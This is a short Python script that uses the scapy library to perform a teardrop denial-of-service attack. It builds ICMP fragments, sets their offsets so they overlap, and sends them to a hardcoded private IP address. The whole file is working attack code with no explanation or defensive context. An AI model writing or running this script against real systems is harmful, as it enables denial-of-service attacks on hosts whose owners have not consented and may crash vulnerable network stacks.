from scapy.all import *

def teardrop(target_ip):
    payload = b"A" * 64 

    
    frags = fragment(IP(dst=target_ip)/ICMP()/payload, fragsize=8)
        
    #Set offsets to give overlap   
    frags[0][IP].frag = 0    # offset = 0
    frags[1][IP].frag = 1    # offset = 8
    frags[2][IP].frag = 1    # offset = 8..., direct overlap
    frags[3][IP].frag = 2  
    frags[4][IP].frag = 2  
    frags[5][IP].frag = 3  
    frags[6][IP].frag = 3  
    frags[7][IP].frag = 4  

    
    for frag in frags[:8]:
        send(frag)
        print(f"Sent fragment with offset {frag[IP].frag * 8}")


target_ip = "192.168.1.100"
teardrop(target_ip)
